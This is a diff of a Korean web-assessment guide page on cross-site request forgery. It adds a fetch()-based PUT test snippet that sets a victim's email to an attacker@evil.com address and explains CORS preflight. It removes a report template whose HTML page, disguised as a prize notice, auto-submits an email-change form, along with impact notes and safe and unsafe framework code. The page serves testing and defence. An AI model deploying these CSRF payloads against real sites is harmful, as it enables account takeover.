@@ -1,13 +1,12 @@
 ---
 sidebar_position: 20
-title: 크로스 사이트 요청 위조 (CSRF)
-description: 웹 진단 - CSRF 점검 절차, 토큰/Referer/Origin 검증 우회, GET 변경, SameSite, PoC HTML 양식
+title: CSRF
+description: 웹 진단 - CSRF 점검 절차, 토큰/Referer/Origin 검증 우회, GET 변경, SameSite, 판정 기준
 keywords: [CSRF, XSRF, Cross-Site Request Forgery, SameSite, Anti-CSRF Token, Synchronizer Token, OWASP A01]
 draft: false
 ---
 
-# 크로스 사이트 요청 위조 (Cross-Site Request Forgery, CSRF)
-
+# 크로스 사이트 요청 위조
 > 인증된 사용자가 공격자 사이트 방문 시, 자신의 의도와 무관하게 대상 사이트로 **변경 요청** (이체·비밀번호 변경·권한 부여 등) 이 자동 전송되는 취약점.
 > 관리자 대상 + 임팩트 큰 액션이면 단일 결함만으로 시스템 전체 침해까지 가능.
 
@@ -66,9 +65,9 @@ Burp 시퀀스에서 다음을 모두 수집:
 
 토큰 제거/변조, Referer 제거/변조, GET 변환, JSON Content-Type 우회 (케이스 1~6).
 
-### Step 4. PoC HTML 작성 + 다른 도메인 트리거 확인
+### Step 4. 다른 origin 트리거 확인
 
-다른 origin (`http://attacker.com/poc.html`) 에서 호스팅된 HTML 이 자동으로 변경 요청을 트리거하는지 실제 동작 확인. 보고서에 첨부할 HTML 파일도 이 단계에서 확정.
+다른 origin (`http://attacker.com/poc.html`) 에서 호스팅된 HTML 이 자동으로 변경 요청을 트리거하는지 실제 브라우저로 확인. Burp Repeater에서 쿠키를 붙여 보낸 요청이 성공하는 것만으로는 CSRF 입증이 아니다.
 
 ---
 
@@ -136,8 +135,7 @@ Burp 시퀀스에서 다음을 모두 수집:
 
 **판정**: 위 변형 중 하나로 정상 응답이 나오면 검증 우회 가능 = 취약.
 
-### 케이스 4: GET 으로 상태 변경 (가장 위험한 단순 케이스)
-
+### 케이스 4: GET 으로 상태 변경
 **언제 쓰는지**: 변경 액션이 GET 으로 처리되는 경우. 옛날 시스템이나 잘못된 RESTful 설계에서 발견.
 
 **예시 요청:**
@@ -173,8 +171,7 @@ Set-Cookie: SESSION=...; HttpOnly; SameSite=None  ← 명시적 None
 
 **판정**: SameSite 미흡 자체는 세션 페이지에서 보고. CSRF 페이지에서는 그 결함과 결합된 POST CSRF 가능성을 함께 보고.
 
-### 케이스 6: JSON CSRF (한정 케이스)
-
+### 케이스 6: JSON CSRF
 **언제 쓰는지**: 백엔드 API 가 `Content-Type: application/json` 만 받으면 표준 CSRF 가 어려움. 단, **백엔드가 다른 Content-Type 도 받아주는 경우** 우회 가능.
 
 **시나리오 6-1 — `text/plain` 으로 JSON 본문 전송:**
@@ -194,8 +191,29 @@ Set-Cookie: SESSION=...; HttpOnly; SameSite=None  ← 명시적 None
 
 **판정**: 위 변형 중 하나로 변경이 적용되면 취약. 모던 백엔드(Spring `@RequestBody`, Express `express.json()`) 는 Content-Type 검증이 엄격하므로 거의 안 통하지만, 점검 항목으로는 시도.
 
-### 그 외 — 짧게 언급만 (실무 비중 낮음 / 영향도 낮음)
+### 케이스 7: `fetch()` 기반 PUT/DELETE 검증 시 주의
 
+**언제 쓰는지**: 변경 액션이 `PUT /api/member/update`, `DELETE /api/member/withdraw` 처럼 폼으로 직접 보내기 어려운 메서드일 때.
+
+```html
+<script>
+fetch('https://<TARGET>/api/member/update', {
+  method: 'PUT',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({
+    email: 'attacker@evil.com',
+    phone: '010-0000-0000'
+  })
+});
+</script>
+```
+
+이 형태는 브라우저가 CORS preflight(`OPTIONS`)를 먼저 보내므로, 서버가 공격자 origin을 허용하지 않으면 실제 `PUT` 요청이 전송되지 않는다. `DELETE` 역시 simple method가 아니므로 동일하게 preflight 대상이다.
+
+**판정:** 공격자 origin에서 실제 브라우저로 열었을 때 preflight가 통과하고, 피해자 세션 쿠키가 포함된 본 요청이 전송되어 상태 변경까지 완료되면 CSRF. preflight에서 막히면 해당 `fetch()` 경로의 CSRF는 불발이며, 표준 form 전송이 가능한 `POST`, GET 변경, method override, Content-Type 우회 가능성을 별도로 본다.
+
+### 그 외 — 짧게 언급만
 - **Login CSRF** — 공격자 계정으로 피해자가 로그인되도록 유도하는 변형. 가끔 발견되지만 영향도 낮음
 - **CSRF + XSS 결합으로 토큰 추출** — XSS 가 있으면 그 자체가 더 큰 문제. 별도 다루지 않음
 - **CORS 잘못 설정 + CSRF 결합** — `cors.md`(Priority 2) 로 분리
@@ -218,196 +236,7 @@ Set-Cookie: SESSION=...; HttpOnly; SameSite=None  ← 명시적 None
 - [ ] 인증 불필요한 공개 API 는 CSRF 대상 아님
 - [ ] `Authorization: Bearer ...` 헤더만 사용하고 쿠키 세션 안 쓰는 API 는 CSRF 영향 없음 (브라우저가 헤더를 자동 추가하지 않음)
 - [ ] 조회 요청은 CSRF 보호 불필요 (단, 케이스 4의 GET 변경은 별개)
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-**[CSRF] - 이메일 변경 기능에 CSRF 토큰 미적용**
-
-1. 피해자 계정으로 `<TARGET>` 정상 로그인 후 세션 유지
-2. 다른 도메인(`http://attacker.com/poc.html`) 에서 아래 HTML 호스팅
-3. 피해자가 공격자 링크 클릭 시 자동으로 이메일이 변경됨
-
-**PoC HTML (`poc.html` — 공격자 호스팅):**
-
-```html
-<!DOCTYPE html>
-<html>
-<head><title>경품 당첨 안내</title></head>
-<body>
-  <h1>경품 당첨을 축하드립니다!</h1>
-  <p>잠시만 기다려주세요...</p>
-
-  <form id="csrf" action="https://<TARGET>/api/profile/email" method="POST">
-    <input type="hidden" name="email" value="attacker@evil.com">
-  </form>
-  <script>
-    document.getElementById('csrf').submit();
-  </script>
-</body>
-</html>
-```
-
-**전송되는 요청 (피해자 브라우저 → TARGET):**
-
-```http
-POST /api/profile/email HTTP/1.1
-Host: <TARGET>
-Origin: http://attacker.com
-Referer: http://attacker.com/poc.html
-Cookie: SESSION=victim_session_token       ← 인증 쿠키 자동 전송
-Content-Type: application/x-www-form-urlencoded
-
-email=attacker%40evil.com
-```
-
-**응답 — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-
-{"status":"ok","email":"attacker@evil.com"}
-```
-
-**확인 사항:**
-- 요청 본문에 CSRF 토큰이 없는데도 정상 200 응답 + 이메일 변경 적용됨
-- Origin 헤더가 `http://attacker.com` 인데 검증 없이 통과
-- SameSite 미설정으로 인증 쿠키가 크로스사이트 요청에도 자동 전송됨
-- 변경된 이메일로 비밀번호 재설정 메일을 받아 **계정 완전 탈취** 시나리오까지 입증 가능 (별첨 시나리오)
-
----
-
-## 영향도 분석
-
-- **무결성 (Integrity)**: 🔴 — CSRF 의 본질. 의도하지 않은 데이터/설정 변경.
-- **기밀성 (Confidentiality)**: 🟡 — 직접 정보 노출은 적음, 단 이메일/비밀번호 변경 후 계정 탈취 → 정보 노출
-- **가용성 (Availability)**: 🟡 — 계정 잠금/삭제 액션이 CSRF 가능하면 가용성 영향
-- **추가 위협**:
-  - **이메일 변경 → 비밀번호 재설정 → 계정 완전 탈취**
-  - **관리자 대상 CSRF** — 사용자 권한 부여, 사용자 삭제, 시스템 설정 변경 (피싱 메일 + 관리자 클릭으로 트리거)
-  - **이체/결제 CSRF** — 직접적 금전 손실
-  - **권한 부여 CSRF** — `role=admin` 변경
-
-**비즈니스 임팩트:**
-CSRF 단독 결함이라도 이메일 변경 → 비밀번호 재설정 흐름과 결합되면 **계정 탈취** 로 이어지며, 관리자 대상 CSRF 는 시스템 침해와 동일한 등급. 실무 진단에서는 변경 액션마다 토큰/검증 적용 여부를 일일이 확인해야 누락된 엔드포인트를 잡을 수 있음.
-
----
-
-## 대응방안
-
-### 개발자 관점 (필수)
-
-1. **Anti-CSRF 토큰 (Synchronizer Token Pattern)** — 가장 확실한 방어. **프레임워크 기본 기능 사용** 권장:
-   - Django: `{% csrf_token %}` + `@csrf_protect` (기본 활성)
-   - Spring Security: CSRF Protection 기본 활성, `CookieCsrfTokenRepository` 옵션
-   - Express: `csrf-csrf` 또는 `lusca` (옛 `csurf` 는 deprecated)
-   - Rails: `protect_from_forgery` (기본 활성)
-   - 토큰 검증은 **사용자별** 로 매칭 (다른 사용자 토큰 거부)
-
-2. **SameSite 쿠키** — `SameSite=Lax` (기본 권장) 또는 `Strict` (외부 인입이 적은 사이트). 세션 페이지의 정답과 동일.
-
-3. **Origin / Referer 검증** — Anti-CSRF 토큰의 보조 수단으로 함께 적용:
-   - Origin 헤더가 없거나 화이트리스트와 불일치하면 거부
-   - **null Origin 도 거부** (sandbox iframe 등)
-   - Referer 검증은 contains 가 아니라 정확한 도메인 매칭
-
-4. **변경 액션은 GET 금지** — RESTful 원칙대로 POST/PUT/DELETE/PATCH 만 사용:
-   - GET: 조회 (멱등, 안전)
-   - POST/PUT/DELETE/PATCH: 변경 (CSRF 보호 필수)
-
-5. **민감 액션은 비밀번호 재입력 / MFA 재확인** — 이체, 비밀번호 변경, 권한 부여, 계정 삭제 등은 토큰만으로 부족. 추가 인증 단계 권장.
-
-6. **Content-Type 엄격 검증** (JSON CSRF 방어) — JSON API 는 `Content-Type: application/json` 만 허용, 다른 타입은 415 응답.
-
-### 운영자 관점
-
-1. **`X-Frame-Options: DENY`** 또는 **CSP `frame-ancestors 'none'`** — Clickjacking 방어 (CSRF 의 변형 공격 차단).
-
-2. **HSTS** — HTTPS 강제로 MITM 통한 SameSite 우회 차단.
-
-### 안전 / 위험 코드 비교 (스택별)
-
-**Django:**
-
-```python
-# 위험 — CSRF 보호 비활성
-@csrf_exempt        # 절대 사용 금지 (특수 케이스 외)
-def update_email(request):
-    request.user.email = request.POST['email']
-    request.user.save()
-
-# 안전 — Django 기본 보호 활용
-# settings.py 에 'django.middleware.csrf.CsrfViewMiddleware' 활성 (기본)
-# 템플릿에 {% csrf_token %} 포함
-def update_email(request):
-    if request.method == 'POST':
-        request.user.email = request.POST['email']
-        request.user.save()
-        return JsonResponse({'status': 'ok'})
-
-# AJAX 호출 시 헤더로 전송
-# fetch('/update', { headers: { 'X-CSRFToken': getCookie('csrftoken') } })
-```
-
-**Spring Security:**
-
-```java
-// 위험 — CSRF 비활성
-@Override
-protected void configure(HttpSecurity http) throws Exception {
-    http.csrf().disable();          // 절대 금지 (REST API 에서 토큰 인증만 쓰는 경우 외)
-}
-
-// 안전 — 기본 보호 활성 + 쿠키 기반 토큰 (SPA 친화)
-@Override
-protected void configure(HttpSecurity http) throws Exception {
-    http
-        .csrf()
-            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
-        .and()
-        // ... 다른 설정
-        ;
-}
-// SPA 는 XSRF-TOKEN 쿠키를 읽어서 X-XSRF-TOKEN 헤더로 전송
-```
-
-**Express (Node.js):**
-
-```javascript
-// 위험 — CSRF 보호 없음
-app.post('/api/profile/email', requireAuth, (req, res) => {
-    req.user.email = req.body.email;
-    req.user.save();
-    res.json({ ok: true });
-});
-
-// 안전 — csrf-csrf 미들웨어 사용
-const { doubleCsrf } = require('csrf-csrf');
-
-const { generateToken, doubleCsrfProtection } = doubleCsrf({
-    getSecret: () => process.env.CSRF_SECRET,
-    cookieName: '__Host-csrf',
-    cookieOptions: { httpOnly: true, secure: true, sameSite: 'lax' },
-});
-
-app.use(doubleCsrfProtection);
-
-// 폼 렌더링 시 토큰 발급
-app.get('/profile', requireAuth, (req, res) => {
-    const token = generateToken(req, res);
-    res.render('profile', { csrfToken: token });
-});
-
-// 클라이언트는 토큰을 헤더(X-CSRF-Token) 또는 form field 로 전송
-app.post('/api/profile/email', requireAuth, (req, res) => {
-    // doubleCsrfProtection 미들웨어가 자동 검증
-    req.user.email = req.body.email;
-    req.user.save();
-    res.json({ ok: true });
-});
-```
+- [ ] Repeater에서 쿠키를 직접 붙여 PUT/DELETE가 성공한 것만으로는 CSRF 아님 — 다른 origin 브라우저 실행과 preflight 통과 여부까지 확인
 
 ---
 
